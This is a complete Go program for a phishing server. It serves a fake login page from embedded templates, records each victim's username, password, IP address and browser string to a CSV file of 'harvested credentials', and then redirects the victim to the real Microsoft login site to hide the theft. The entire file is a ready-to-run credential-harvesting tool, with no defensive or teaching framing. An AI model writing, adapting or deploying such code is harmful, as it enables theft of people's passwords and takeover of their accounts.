package main

import (
	"embed"
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"time"
)

//go:embed templates/*
var content embed.FS

var (
	port     = flag.String("port", "8080", "Port to run the server on")
	logFile  = flag.String("log", "logs/credentials.csv", "File to store harvested credentials")
	tmplName = flag.String("template", "login.html", "Template to serve")
)

func main() {
	flag.Parse()

	tmpl, err := template.ParseFS(content, "templates/"+*tmplName)
	if err != nil {
		log.Fatalf("Template parse error: %v", err)
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodGet {
			_ = tmpl.Execute(w, nil)
			return
		}

		if err := r.ParseForm(); err != nil {
			http.Error(w, "Invalid form data", http.StatusBadRequest)
			return
		}

		username := r.FormValue("username")
		password := r.FormValue("password")
		ip := r.RemoteAddr
		ua := r.UserAgent()

		logLine := fmt.Sprintf("%s,%s,%s,%s,%s\n",
			time.Now().Format(time.RFC3339),
			username,
			password,
			ip,
			ua,
		)

		fmt.Println("[+] Captured:", logLine)

		f, err := os.OpenFile(*logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Println("Failed to write log:", err)
		} else {
			defer f.Close()
			f.WriteString(logLine)
		}

		// Optionally redirect to legit site or show fake error
		http.Redirect(w, r, "https://login.microsoftonline.com/", http.StatusFound)
	})

	fmt.Printf("[*] Serving fake login on :%s\n", *port)
	log.Fatal(http.ListenAndServe(":"+*port, nil))
}
